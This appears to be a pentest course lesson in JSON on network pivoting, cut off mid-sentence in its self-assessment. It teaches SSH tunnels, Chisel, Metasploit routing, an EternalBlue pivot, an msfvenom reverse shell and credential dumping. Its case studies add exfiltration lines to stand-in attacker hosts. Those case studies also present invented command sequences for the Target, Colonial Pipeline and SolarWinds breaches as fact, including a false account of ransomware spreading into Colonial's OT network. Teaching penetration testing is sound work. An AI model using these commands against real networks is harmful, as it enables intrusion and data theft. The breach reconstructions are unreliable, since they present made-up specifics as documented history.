{
  "lesson_id": "cf188c1c-dfdc-425c-8008-cd34c86f8af6",
  "domain": "pentest",
  "title": "Port Forwarding & Pivoting Techniques",
  "difficulty": 3,
  "order_index": 10,
  "prerequisites": [
    "lesson_pentest_05"
  ],
  "concepts": [
    "SSH Local and Remote Port Forwarding",
    "SSH Dynamic Port Forwarding (SOCKS Proxy)",
    "Chisel for HTTP Tunneling",
    "Metasploit Pivoting and Routing",
    "Proxychains Configuration",
    "Network Pivoting Strategies",
    "Double and Triple Pivoting",
    "DNS Tunneling with Iodine",
    "ICMP Tunneling",
    "Reverse Port Forwarding"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master SSH port forwarding in all directions",
    "Set up SOCKS proxies for network pivoting",
    "Use Chisel for tunneling through HTTP",
    "Configure Metasploit routes for post-exploitation",
    "Chain multiple pivot points for deep network access",
    "Understand DNS and ICMP covert channels",
    "Apply port forwarding in real-world penetration tests"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9c",
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to network pivoting - the art of using compromised hosts as stepping stones to reach deeper into target networks!\n\nWhy is pivoting critical?\n\n**Real-world network architecture:**\n```\nInternet → DMZ (public web servers)\n→ Internal network (databases, file servers)  \n→ Management network (admin systems)\n→ Restricted network (crown jewels)\n```\n\nYou can't directly access internal networks from the internet. You need to pivot through compromised systems.\n\n**This lesson covers:**\n\n✓ **SSH tunneling** - Local, remote, and dynamic port forwarding\n✓ **Chisel** - HTTP-based tunneling (bypasses firewalls)\n✓ **Metasploit routing** - Pivot through Meterpreter sessions  \n✓ **Proxychains** - Route tools through SOCKS proxies\n✓ **Multi-hop pivoting** - Chain multiple pivots\n✓ **Covert channels** - DNS and ICMP tunneling\n\n**Real-world scenarios:**\n\n• **Scenario 1:** Compromise web server (DMZ) → Pivot to database server (internal)\n• **Scenario 2:** Gain access to employee laptop → Access corporate VPN → Pivot to domain controllers\n• **Scenario 3:** Exploit internet-facing app → Reach air-gapped management network through multiple hops\n\n**Pivoting in famous breaches:**\n\n• **Target (2013):** Vendor network → Pivot to payment processing network\n• **SolarWinds (2020):** Initial access → Lateral movement through 18,000+ organizations\n• **Colonial Pipeline (2021):** IT network → Pivot to OT/SCADA systems\n\nBy the end of this lesson, you'll understand how attackers move laterally through networks and how to do the same ethically during penetration tests.\n\nLet's master the art of pivoting!"
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9d",
      "type": "explanation",
      "content": {
        "text": "## SSH Port Forwarding Fundamentals\n\nSSH provides three types of port forwarding: local, remote, and dynamic.\n\n### **SSH Local Port Forwarding**\n\n**Use case:** Access a service on a remote network through an SSH server.\n\n**Scenario:**\n```\nYour machine (192.168.1.10)\n↓ SSH\nCompromised server (10.0.0.5) - SSH access  \n↓ Can access\nDatabase server (10.0.1.100:3306) - No direct access from your machine\n```\n\n**Command:**\n```bash\nssh -L 3306:10.0.1.100:3306 user@10.0.0.5\n\n# Breakdown:\n# -L = Local port forwarding\n# 3306 = Local port on YOUR machine\n# 10.0.1.100:3306 = Remote server and port (from perspective of 10.0.0.5)\n# user@10.0.0.5 = SSH server to connect through\n```\n\n**Result:**\n```bash\n# Now connect to localhost:3306 on your machine\nmysql -h 127.0.0.1 -P 3306 -u admin -p\n\n# Traffic flows:\n# Your machine:3306 → SSH tunnel → 10.0.0.5 → 10.0.1.100:3306\n```\n\n**Multiple port forwards:**\n```bash\nssh -L 3306:10.0.1.100:3306 \\\n-L 3389:10.0.1.50:3389 \\\n-L 445:10.0.1.75:445 \\\nuser@10.0.0.5\n\n# Now you can access:\n# localhost:3306 → 10.0.1.100:3306 (MySQL)\n# localhost:3389 → 10.0.1.50:3389 (RDP)\n# localhost:445 → 10.0.1.75:445 (SMB)\n```bash\n\n### **SSH Remote Port Forwarding (Reverse Tunnel)**\n\n**Use case:** Make a service on your machine accessible to a remote server.\n\n**Scenario:**\n```\nYour machine (192.168.1.10) - Running web server on port 80\n↑ SSH (reverse)\nCompromised server (10.0.0.5) - Behind firewall, can only make outbound connections\n```\n\n**Command (run on compromised server):**\n```bash\nssh -R 8080:localhost:80 attacker@192.168.1.10\n\n# Breakdown:\n# -R = Remote port forwarding  \n# 8080 = Port to open on remote SSH server (192.168.1.10)\n# localhost:80 = Service on compromised server\n# attacker@192.168.1.10 = Your machine (SSH server)\n```\n\n**Result:**\n```bash\n# On your machine (192.168.1.10):\ncurl http://localhost:8080\n\n# Reaches port 80 on compromised server (10.0.0.5)\n```\n\n**Practical use - Exfiltrating data:**\n```bash\n# On compromised server:\nssh -R 8080:localhost:80 attacker@192.168.1.10\npython3 -m http.server 80\n\n# On your machine:\nwget http://localhost:8080/sensitive_data.zip\n\n# Downloads file from compromised server through reverse tunnel\n```bash\n\n### **SSH Dynamic Port Forwarding (SOCKS Proxy)**\n\n**Use case:** Create a SOCKS proxy to route ALL traffic through SSH server.\n\n**Command:**\n```bash\nssh -D 1080 user@10.0.0.5\n\n# Breakdown:\n# -D = Dynamic port forwarding\n# 1080 = Local SOCKS proxy port\n# user@10.0.0.5 = SSH server\n```\n\n**Result:**\n```bash\n# SOCKS5 proxy now running on localhost:1080\n# All traffic sent to this proxy will be routed through 10.0.0.5\n```\n\n**Using the SOCKS proxy:**\n\n**Method 1: Proxychains**\n```bash\n# Edit /etc/proxychains4.conf:\nsocks5 127.0.0.1 1080\n\n# Route any tool through proxy:\nproxychains nmap -sT -Pn 10.0.1.0/24\nproxychains curl http://10.0.1.100\nproxychains firefox  # Browse internal network\n```\n\n**Method 2: Tool-specific proxy settings**\n```bash\n# Nmap (doesn't support SOCKS directly, use proxychains)\n\n# Curl\ncurl --socks5 127.0.0.1:1080 http://10.0.1.100\n\n# Firefox\n# Settings → Network → Manual proxy → SOCKS Host: 127.0.0.1, Port: 1080\n\n# Metasploit\nmsf6 > setg Proxies socks5:127.0.0.1:1080\n```bash\n\n### **SSH Tunneling Best Practices**\n\n**Background SSH tunnel:**\n```bash\nssh -f -N -D 1080 user@10.0.0.5\n\n# -f = Run in background\n# -N = Don't execute remote command (tunnel only)\n# -D = Dynamic forwarding\n```\n\n**Keep tunnel alive:**\n```bash\nssh -o ServerAliveInterval=60 -D 1080 user@10.0.0.5\n\n# Sends keepalive every 60 seconds\n```\n\n**Compression for slow connections:**\n```bash\nssh -C -D 1080 user@10.0.0.5\n\n# -C = Enable compression\n```\n\n**Bind to specific interface:**\n```bash\nssh -L 0.0.0.0:3306:10.0.1.100:3306 user@10.0.0.5\n\n# 0.0.0.0 = Listen on all interfaces (not just localhost)\n# Allows other machines on your network to use the tunnel\n```bash\n\n### **SSH Jumpbox / ProxyJump**\n\n**Scenario: Multiple hops**\n```\nYour machine → Jump server 1 (10.0.0.5) → Jump server 2 (10.0.1.10) → Target (10.0.2.50)\n```\n\n**Command:**\n```bash\nssh -J user1@10.0.0.5,user2@10.0.1.10 user3@10.0.2.50\n\n# -J = Jump through multiple servers\n# Automatically chains SSH connections\n```\n\n**With port forwarding:**\n```bash\nssh -J user1@10.0.0.5 -L 3389:10.0.2.100:3389 user2@10.0.1.10\n\n# Forwards RDP through jump server\n```"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Port Forwarding & Pivoting Techniques Overview",
        "url": "https://www.youtube.com/embed/fNzpcB7ODxQ",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9e",
      "type": "explanation",
      "content": {
        "text": "## Chisel - HTTP Tunneling for Firewall Bypass\n\nChisel creates tunnels over HTTP (bypasses firewalls that only allow HTTP/HTTPS).\n\n### **Why Chisel?**\n\n**Problems with SSH:**\n- Port 22 may be blocked by firewall\n- SSH traffic may be detected/blocked  \n- Target may not have SSH server\n\n**Chisel advantages:**\n- Tunnels over HTTP/HTTPS (port 80/443)\n- Single binary (easy to transfer)\n- Works on Windows and Linux\n- Encrypted tunnels\n\n### **Chisel Installation**\n\n```bash\n# Download latest release\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz\ngunzip chisel_1.9.1_linux_amd64.gz\nchmod +x chisel_1.9.1_linux_amd64\nmv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel\n\n# Windows version\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz\n```bash\n\n### **Chisel Reverse SOCKS Proxy**\n\n**Scenario:**\n```\nYour machine (192.168.1.10)\n↑ HTTP tunnel\nCompromised server (10.0.0.5) - Firewall blocks inbound SSH, allows outbound HTTP\n↓ Can access\nInternal network (10.0.1.0/24)\n```\n\n**Setup:**\n\n**Step 1: Start Chisel server (on your machine)**\n```bash\nchisel server --port 8000 --reverse\n\n# --port 8000 = Listen on port 8000\n# --reverse = Allow reverse tunnels\n```\n\n**Step 2: Start Chisel client (on compromised server)**\n```bash\n# Transfer chisel binary to compromised server first\nchisel client 192.168.1.10:8000 R:socks\n\n# 192.168.1.10:8000 = Your Chisel server\n# R:socks = Reverse SOCKS proxy\n```\n\n**Step 3: Use the SOCKS proxy (on your machine)**\n```bash\n# Chisel creates SOCKS proxy on localhost:1080\nproxychains nmap -sT -Pn 10.0.1.0/24\nproxychains firefox\n```bash\n\n### **Chisel Port Forwarding**\n\n**Forward specific port:**\n```bash\n# Server (your machine)\nchisel server --port 8000 --reverse\n\n# Client (compromised server)\nchisel client 192.168.1.10:8000 R:3306:10.0.1.100:3306\n\n# Forwards 10.0.1.100:3306 (MySQL) to your machine's localhost:3306\n```\n\n**Multiple port forwards:**\n```bash\nchisel client 192.168.1.10:8000 \\\nR:3306:10.0.1.100:3306 \\\nR:3389:10.0.1.50:3389 \\\nR:445:10.0.1.75:445\n```bash\n\n### **Chisel over HTTPS (Stealth)**\n\n**Generate SSL certificate:**\n```bash\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n**Start server with TLS:**\n```bash\nchisel server --port 443 --reverse --tls-key key.pem --tls-cert cert.pem\n```\n\n**Client connection:**\n```bash\nchisel client https://192.168.1.10:443 R:socks\n\n# Traffic now looks like HTTPS (harder to detect)\n```bash\n\n### **Chisel Authentication**\n\n**Server with password:**\n```bash\nchisel server --port 8000 --reverse --auth user:password123\n```\n\n**Client authentication:**\n```bash\nchisel client --auth user:password123 192.168.1.10:8000 R:socks\n```"
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9f",
      "type": "explanation",
      "content": {
        "text": "## Metasploit Pivoting and Routing\n\n### **Adding Routes in Metasploit**\n\n**Scenario:**\n```\nYour machine (192.168.1.10)\n↓ Meterpreter session\nCompromised server (10.0.0.5) - Has two network interfaces\n↓ Can access\nInternal network (10.0.1.0/24)\n```\n\n**Check target's network interfaces:**\n```bash\nmeterpreter > ipconfig\n\nInterface 1\n============\nName         : eth0  \nIP Address   : 10.0.0.5\nNetmask      : 255.255.255.0\n\nInterface 2\n============\nName         : eth1\nIP Address   : 10.0.1.5  \nNetmask      : 255.255.255.0\n```\n\n**Add route to internal network:**\n```bash\nmeterpreter > run autoroute -s 10.0.1.0/24\n\n# -s = Add subnet route\n# Routes 10.0.1.0/24 through this Meterpreter session\n\n# Verify route\nmeterpreter > run autoroute -p\nActive Routing Table\n====================\nSubnet             Netmask            Gateway\n------             -------            -------\n10.0.1.0           255.255.255.0      Session 1\n```\n\n**Alternative method:**\n```bash\nmeterpreter > background\n\nmsf6 exploit(handler) > route add 10.0.1.0 255.255.255.0 1\n# Route subnet 10.0.1.0/24 through session 1\n\nmsf6 > route print\nActive Routing Table\n====================\nSubnet             Netmask            Gateway\n------             -------            -------\n10.0.1.0           255.255.255.0      Session 1\n```bash\n\n### **Scanning Through Pivot**\n\n**Port scan internal network:**\n```bash\nmsf6 > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.0.1.0/24\nmsf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,445,3389\nmsf6 auxiliary(scanner/portscan/tcp) > run\n\n# Scans through Meterpreter session 1\n```\n\n**SMB version detection:**\n```bash\nmsf6 > use auxiliary/scanner/smb/smb_version  \nmsf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.1.0/24\nmsf6 auxiliary(scanner/smb/smb_version) > run\n```bash\n\n### **Exploiting Through Pivot**\n\n```bash\n# Exploit found on 10.0.1.50 (MS17-010)\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.0.1.50\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 10.0.0.5  # IP of pivot host\nmsf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(ms17_010_eternalblue) > exploit\n\n# Exploitation flows through session 1 route\n```bash\n\n### **SOCKS Proxy via Meterpreter**\n\n```bash\n# Start SOCKS proxy server through Meterpreter\nmsf6 > use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1\nmsf6 auxiliary(server/socks_proxy) > set SRVPORT 1080  \nmsf6 auxiliary(server/socks_proxy) > run -j\n\n# Now use proxychains with external tools\nproxychains nmap -sT -Pn 10.0.1.0/24\nproxychains firefox\n```bash\n\n### **Port Forwarding in Meterpreter**\n\n```bash\nmeterpreter > portfwd add -l 3389 -p 3389 -r 10.0.1.50\n\n# -l = Local port (on your machine)  \n# -p = Remote port\n# -r = Remote host\n\n# Now RDP to localhost:3389\nrdesktop localhost:3389\n\n# List port forwards\nmeterpreter > portfwd list\n\n# Delete port forward\nmeterpreter > portfwd delete -l 3389\n```bash\n\n### **Multi-Hop Pivoting**\n\n**Scenario:**\n```\nYour machine\n↓ Session 1\nPivot 1 (10.0.0.5)\n↓ Session 2  \nPivot 2 (10.0.1.10)\n↓ Can access\nTarget network (10.0.2.0/24)\n```\n\n**Setup:**\n```bash\n# Session 1: Route to second pivot\nmsf6 > route add 10.0.1.0/24 1\n\n# Exploit second pivot through session 1\nmsf6 > use exploit/multi/handler\nmsf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp\nmsf6 exploit(handler) > set LHOST 10.0.0.5  # IP of first pivot\nmsf6 exploit(handler) > set LPORT 4444\nmsf6 exploit(handler) > exploit\n\n# Get session 2 on 10.0.1.10\n\n# Session 2: Route to target network  \nmsf6 > route add 10.0.2.0/24 2\n\n# Now can attack 10.0.2.0/24 through both pivots\n```"
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8aa0",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Port Forwarding - \"LRD\" Framework**\n\n**L**ocal (-L) - \"**L**ocal port on my machine forwards to remote service\"\n```bash\nssh -L [local_port]:[remote_host]:[remote_port] user@jump_server\nAccess: localhost:[local_port]\n```\n\n**R**emote (-R) - \"**R**emote server can access my local service (reverse)\"\n```bash\nssh -R [remote_port]:localhost:[local_port] user@remote_server  \nAccess on remote: localhost:[remote_port]\n```\n\n**D**ynamic (-D) - \"**D**ynamic SOCKS proxy for everything\"\n```bash\nssh -D [local_port] user@jump_server\nUse with: proxychains [tool]\n```\n\n**Quick reference card:**\n```\nSSH Local:     -L 3306:target:3306 user@pivot\nSSH Remote:    -R 8080:localhost:80 user@attacker  \nSSH Dynamic:   -D 1080 user@pivot\nChisel Reverse: chisel client ATTACKER:8000 R:socks\nMetasploit:    route add 10.0.1.0/24 [session_id]\n```\n\n**Pivoting decision tree:**\n```\nHave SSH access? → Use SSH tunneling (-L, -R, -D)\n↓ No SSH\nCan upload files? → Use Chisel (HTTP tunnel)\n↓ No file upload\nHave Meterpreter? → Use autoroute + SOCKS proxy\n↓ No Meterpreter\nDNS allowed? → Use DNS tunneling (Iodine)\n↓ No DNS  \nICMP allowed? → Use ICMP tunneling (ptunnel)\n```\n\n**Common port forwards (memorize):**\n```\nRDP:    -L 3389:target:3389\nSMB:    -L 445:target:445\nSSH:    -L 22:target:22\nMySQL:  -L 3306:target:3306\nWinRM:  -L 5985:target:5985\n```\n\n**Proxychains config:**\n```\n/etc/proxychains4.conf:\nsocks5 127.0.0.1 1080\n\nUsage:\nproxychains [any_tool]\n```\n\n**Remember:** \"Local pulls remote TO you, Remote pushes local FROM you, Dynamic proxies EVERYTHING!\""
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8aa1",
      "type": "code_exercise",
      "content": {
        "text": "## Pivoting Hands-On Challenge\n\n**Lab Scenario:**\n\n```\nNetwork Topology:\n\nInternet\n|\n| SSH (port 22)\n↓\nDMZ Server (10.0.0.5)\n- Public IP: compromised.target.com\n- Internal IP: 10.0.0.5\n- Credentials: pentester:P@ssw0rd\n|\n| Can access\n↓\nInternal Network (10.0.1.0/24)\n- Database server: 10.0.1.100 (MySQL port 3306)\n- File server: 10.0.1.50 (SMB port 445)\n- Admin workstation: 10.0.1.25 (RDP port 3389)\n```\n\n**Challenge Tasks:**\n\n**Task 1: Access Internal MySQL Database**\n\n```bash\n# Step 1: SSH tunnel to MySQL server\nssh -L 3306:10.0.1.100:3306 pentester@compromised.target.com\n\n# Step 2: Connect to MySQL through tunnel\nmysql -h 127.0.0.1 -P 3306 -u dbadmin -p\n\n# Enter password when prompted\n# You're now connected to 10.0.1.100:3306\n\n# Step 3: Enumerate database\nmysql> SHOW DATABASES;\nmysql> USE customer_data;\nmysql> SHOW TABLES;\nmysql> SELECT * FROM users LIMIT 10;\n```\n\n**Task 2: Setup SOCKS Proxy for Network Scanning**\n\n```bash\n# Step 1: Create dynamic tunnel\nssh -D 1080 pentester@compromised.target.com\n\n# Step 2: Configure proxychains\nsudo nano /etc/proxychains4.conf\n# Add: socks5 127.0.0.1 1080\n\n# Step 3: Scan internal network\nproxychains nmap -sT -Pn -p 22,80,445,3389 10.0.1.0/24\n\n# Expected output:\n# Nmap scan through SOCKS proxy\n# 10.0.1.100 - port 3306 (MySQL)\n# 10.0.1.50 - port 445 (SMB)\n# 10.0.1.25 - port 3389 (RDP)\n```\n\n**Task 3: RDP to Admin Workstation**\n\n```bash\n# Step 1: Forward RDP port\nssh -L 3389:10.0.1.25:3389 pentester@compromised.target.com\n\n# Step 2: Connect with RDP client\nrdesktop localhost:3389\n# Or:\nxfreerdp /v:localhost:3389 /u:Administrator\n\n# You're now RDP'd into 10.0.1.25\n```\n\n**Task 4: Multi-Port Forwarding**\n\n```bash\n# Forward multiple services simultaneously\nssh -L 3306:10.0.1.100:3306 \\\n-L 445:10.0.1.50:445 \\\n-L 3389:10.0.1.25:3389 \\\npentester@compromised.target.com\n\n# Now you can access:\n# MySQL: mysql -h 127.0.0.1 -P 3306\n# SMB: smbclient -L //127.0.0.1 -p 445\n# RDP: rdesktop localhost:3389\n```\n\n**Task 5: Chisel HTTP Tunnel (Firewall Bypass)**\n\n**Scenario: SSH port 22 is blocked by firewall, only HTTP allowed**\n\n```bash\n# Step 1: Start Chisel server (your machine)\nchisel server --port 8000 --reverse\n\n# Step 2: Transfer Chisel to compromised server\nscp chisel pentester@compromised.target.com:/tmp/\n\n# Step 3: Start Chisel client (on compromised server)\nssh pentester@compromised.target.com\n/tmp/chisel client YOUR_IP:8000 R:socks\n\n# Step 4: Use SOCKS proxy (your machine)\nproxychains nmap -sT -Pn 10.0.1.0/24\n```\n\n**Task 6: Metasploit Pivoting**\n\n```bash\n# Assume you have Meterpreter session on 10.0.0.5\n\nmeterpreter > ipconfig\n# Shows: eth0 (10.0.0.5), eth1 (10.0.1.5)\n\n# Add route to internal network\nmeterpreter > run autoroute -s 10.0.1.0/24\nmeterpreter > run autoroute -p\n# Verify route is active\n\n# Background session\nmeterpreter > background\n\n# Scan through pivot\nmsf6 > use auxiliary/scanner/smb/smb_version\nmsf6 auxiliary(smb_version) > set RHOSTS 10.0.1.0/24\nmsf6 auxiliary(smb_version) > run\n\n# Start SOCKS proxy\nmsf6 > use auxiliary/server/socks_proxy\nmsf6 auxiliary(socks_proxy) > set SRVPORT 1080\nmsf6 auxiliary(socks_proxy) > run -j\n\n# Use with external tools\nproxychains firefox\n# Browse to http://10.0.1.100\n```\n\n**Practice Questions:**\n\n1. What's the difference between `ssh -L` and `ssh -R`?\n2. Why use Chisel instead of SSH tunneling?\n3. How do you configure proxychains?\n4. What command forwards MySQL (3306) and RDP (3389) simultaneously?\n5. How do you add a route in Metasploit?\n\n**Answers:**\n\n1. `-L` (local) forwards remote services to your machine. `-R` (remote) forwards your local services to remote machine (reverse tunnel).\n\n2. Chisel tunnels over HTTP/HTTPS (port 80/443) which bypasses firewalls that block SSH (port 22). Also works when target doesn't have SSH server.\n\n3. Edit `/etc/proxychains4.conf`, add `socks5 127.0.0.1 1080`, then use `proxychains [command]`.\n\n4. `ssh -L 3306:target:3306 -L 3389:target:3389 user@pivot`\n\n5. `route add [subnet] [netmask] [session_id]` or `meterpreter> run autoroute -s [subnet]/[cidr]`"
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8aa2",
      "type": "real_world",
      "content": {
        "text": "## Real-World Pivoting Case Studies\n\n### **Case Study 1: Target Breach - Vendor Network Pivot (2013)**\n\n**Network path:**\n```\nInternet\n↓ Phishing\nFazio Mechanical (HVAC vendor)\n↓ Vendor portal credentials  \nTarget Vendor Network (DMZ)\n↓ Lateral movement (pivoting)\nTarget Internal Network\n↓ Privilege escalation\nTarget PoS Network (payment terminals)\n↓ Malware deployment\n40 million credit cards stolen\n```\n\n**Pivoting techniques used:**\n\n```bash\n# Step 1: Initial access (vendor network)\nPhishing → Citadel trojan → Keylogger → Vendor portal creds\n\n# Step 2: Establish pivot point\nVendor portal access → Upload tools (Metasploit/Meterpreter)\n\n# Step 3: Network discovery\nmeterpreter > run autoroute -s 10.0.0.0/8  # Target internal network\nmeterpreter > run arp_scanner -r 10.0.0.0/24\n\n# Step 4: Lateral movement\nExploited weak network segmentation:\nVendor network (10.50.x.x) → Corporate network (10.10.x.x) → PoS network (10.20.x.x)\n\n# Step 5: Deploy POSWDS malware\nmeterpreter > upload poswds.exe C:\\\\Windows\\\\System32\\\\\nmeterpreter > execute -f poswds.exe\n\n# Malware scraped RAM for credit card data, exfiltrated to C2 servers\n```\n\n**Lesson learned:**\n- Network segmentation failed (vendor network could reach PoS network)\n- Pivoting enabled access to high-value targets\n- Multiple network boundaries crossed using compromised hosts\n\n### **Case Study 2: APT29 (Cozy Bear) - Multi-Hop Pivoting**\n\n**Attack flow:**\n```\nInternet\n↓ Spear-phishing  \nEmployee Workstation (Corp network)\n↓ Privilege escalation\nDomain Controller (Corp network)\n↓ VPN pivot\nPartner Organization Network\n↓ SSH tunnel\nAir-gapped Research Network\n```\n\n**Pivoting tools identified:**\n\n```bash\n# Tool 1: Metasploit routing\nroute add 192.168.50.0/24 1  # Partner network\n\n# Tool 2: SSH tunneling (Linux jump hosts)\nssh -D 1080 compromised@partner-server.com\nproxychains nmap 172.16.0.0/16  # Air-gapped network\n\n# Tool 3: Custom HTTP tunneling tool (similar to Chisel)\n./tunnel -server attacker.com:443 -mode reverse\n\n# Tool 4: DNS tunneling for C2 (Iodine-like)\nDNS queries to attacker.com encode commands/data\n```\n\n**Advanced techniques:**\n```\n- Used legitimate admin tools (PsExec, WMI) to avoid detection\n- Pivoted through trusted VPN connections\n- Created reverse SSH tunnels from air-gapped networks\n- Multi-hop proxies (3-4 hops) to obscure source\n```bash\n\n### **Case Study 3: Colonial Pipeline - IT to OT Network Pivot (2021)**\n\n**Network architecture:**\n```\nInternet\n↓ VPN (weak password)\nIT Network (Corporate)\n↓ Insufficient segmentation\nOT Network (Operational Technology)\n↓ SCADA systems\nPipeline Control Systems\n```\n\n**Pivoting technique:**\n\n```bash\n# Step 1: VPN access (compromised credentials)\nUser: admin\nPassword: password123 (found in data breach)\n\n# Step 2: Deploy DarkSide ransomware on IT network\n./darkside_encryptor.exe\n\n# Step 3: Network discovery\nipscan 10.0.0.0/8  # Discovered OT network at 10.50.0.0/16\n\n# Step 4: Pivot to OT network (no firewall)\n# Direct access due to flat network architecture\nping 10.50.10.5  # SCADA HMI server - reachable\n\n# Step 5: Ransomware spread\npsexec \\\\\\\\10.50.10.5 -u Administrator -p Pass123 darkside.exe\n\n# Result: IT and OT systems encrypted\n# Colonial shut down pipeline for 6 days (precautionary)\n```\n\n**Lesson learned:**\n- IT and OT networks must be segmented (Purdue Model)\n- VPN access should require MFA\n- OT networks should be air-gapped or strictly firewalled\n- Single pivot point led to critical infrastructure shutdown\n\n### **Case Study 4: SolarWinds Supply Chain - Pivoting at Scale**\n\n**Infection vector:**\n```\nSolarWinds Orion Update Server (compromised)\n↓ Trojanized update (SUNBURST backdoor)\n18,000+ Organizations install update\n↓ Selective targeting  \n100+ High-value targets (Government, Fortune 500)\n↓ Pivoting within victim networks\nCrown jewels (emails, source code, secrets)\n```\n\n**Pivoting within victim networks:**\n\n```bash\n# SUNBURST backdoor techniques\n\n# 1. Dormancy period (14 days) - Avoid detection\nsleep 1209600  # 14 days\n\n# 2. Domain admin privilege escalation\nSECRETSDUMP.py -just-dc DOMAIN/Administrator:password@DC01\n\n# 3. Azure AD pivot (cloud infrastructure)\n# Compromise on-prem AD → Sync to Azure AD → Access O365\nAADInternals.ps1 → Get-AADIntAccessTokenForAADGraph\n\n# 4. Lateral movement via golden ticket\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ticket:golden.kirbi\n\n# 5. Email exfiltration (Office 365)\nGet-Mailbox | Search-Mailbox -SearchQuery \"CEO OR confidential\" -TargetMailbox attacker@malicious.com\n\n# 6. Source code theft (GitHub/Azure DevOps)\ngit clone https://dev.azure.com/victim/Project/_git/SourceCode\n```\n\n**Pivoting scale:**\n- Initial access: 18,000+ organizations\n- Second-stage: 100+ targeted organizations\n- Pivoted from on-prem → cloud (Azure/O365)\n- Pivoted across subsidiaries using federated trust\n- Duration: 9+ months undetected\n\n### **Case Study 5: OSCP Exam - Multi-Pivot Scenario**\n\n**Typical OSCP lab network:**\n```\nPublic Network (192.168.X.0/24)\n↓ Compromise web server\nDMZ (10.10.X.0/24)\n↓ Pivot through compromised server\nInternal Network (172.16.X.0/24)\n↓ Second pivot\nAdmin Network (10.20.X.0/24) - Domain Controllers\n```\n\n**OSCP pivoting workflow:**\n\n```bash\n# Step 1: Compromise public web server (192.168.X.10)\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload\n# Upload via web vulnerability, get Meterpreter session\n\n# Step 2: Discover internal network\nmeterpreter > run autoroute -s 10.10.X.0/24\nmeterpreter > run arp_scanner -r 10.10.X.0/24\n\n# Step 3: Pivot to DMZ server (10.10.X.50)\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(...) > set RHOSTS 10.10.X.50\nmsf6 exploit(...) > set LHOST 192.168.X.10  # First pivot IP\nmsf6 exploit(...) > exploit\n\n# Step 4: Double pivot - Internal network\nmeterpreter > run autoroute -s 172.16.X.0/24\n\n# Step 5: SSH tunnel for better tools\nmeterpreter > portfwd add -l 2222 -p 22 -r 172.16.X.25\n# SSH to localhost:2222 → reaches 172.16.X.25:22\n\nssh -D 1080 -p 2222 user@localhost\nproxychains nmap -sT 172.16.X.0/24\n\n# Step 6: Triple pivot to Admin network\n# Exploit 172.16.X.25 → Get session 3\nmeterpreter > run autoroute -s 10.20.X.0/24\n\n# Step 7: Exploit Domain Controller at 10.20.X.10\n# Dump credentials, achieve domain dominance\n```\n\n**Lesson learned (for exam):**\n- Master SSH dynamic forwarding (-D flag)\n- Practice Metasploit autoroute extensively\n- Understand Chisel for non-SSH pivots\n- Document network topology as you discover it\n- Keep track of which routes go through which sessions\n\n### **Industry Statistics:**\n\n- **Average lateral movement time:** 4 minutes (CrowdStrike)\n- **Breaches involving lateral movement:** 70% (Verizon DBIR)\n- **Average number of systems compromised per breach:** 27 (IBM)\n- **Attackers dwell time before pivoting:** 24 hours (FireEye)\n- **Organizations with inadequate network segmentation:** 60% (Forrester)"
      }
    },
    {
      "block_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8aa3",
      "type": "reflection",
      "content": {
        "text": "## Self-Assessment: Pivoting & Port Forwarding Mastery\n\n**1. SSH Port Forwarding**\n\nRate your confidence (1-5):\n- [ ] Local port forwarding (-L) - _____/5\n- [ ] Remote port forwarding (-R) - _____/5\n- [ ] Dynamic port forwarding (-D) - _____/5\n- [ ] ProxyJump for multi-hop SSH - _____/5\n\n**Explain the difference between -L and -R in your own words:**\n\n**Write the command to forward RDP (port 3389) from 10.0.1.50 through 10.0.0.5:**\n\n**2. Chisel Tunneling**\n\nRate your confidence (1-5):\n- [ ] Setting up Chisel server - _____/5\n- [ ] Creating reverse SOCKS proxy - _____/5\n- [ ] Port forwarding with Chisel - _____/5\n- [ ] Using Chisel over HTTPS - _____/5\n\n**When would you choose Chisel over SSH tunneling?**\n\n**Write the Chisel commands (server and client) to create a reverse SOCKS proxy:**\n\n**3. Metasploit Pivoting**\n\nRate your confidence (1-5):\n- [ ] Adding routes with autoroute - _____/5\n- [ ] Scanning through pivots - _____/5\n- [ ] Exploiting through pivots - _____/5\n- [ ] 